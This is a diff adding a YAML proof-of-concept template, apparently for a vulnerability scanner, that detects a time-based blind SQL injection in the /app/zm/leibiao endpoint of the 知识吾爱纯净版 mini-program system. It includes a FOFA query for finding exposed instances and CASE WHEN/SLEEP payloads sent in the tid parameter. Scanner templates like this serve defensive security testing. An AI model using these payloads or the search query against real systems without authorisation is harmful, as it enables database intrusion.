@@ -1,0 +1,27 @@
+id: poc-yaml-zhishiwuai-leibiao-sqli
+info:
+  name: 知识吾爱纯净版小程序系统 leibiao SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 知识吾爱纯净版小程序系统
+  fofa: body="域名/skdjfdf"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: POST
+  path: /app/zm/leibiao
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: tid=(CASE WHEN (3711=3712) THEN SLEEP({{.t1}}) ELSE 3711 END)
+  expression: status_code == 200 && contains(body,"\"code\":\"0\"") && contains(body,"已经没有了")
+- method: POST
+  path: /app/zm/leibiao
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: tid=(CASE WHEN (3711=3711) THEN SLEEP({{.t1}}) ELSE 3711 END)
+  expression: status_code == 200 && contains(body,"\"code\":\"1\"") && !contains(body,"<")
+    && duration > t2 && duration < t3
+transport: http
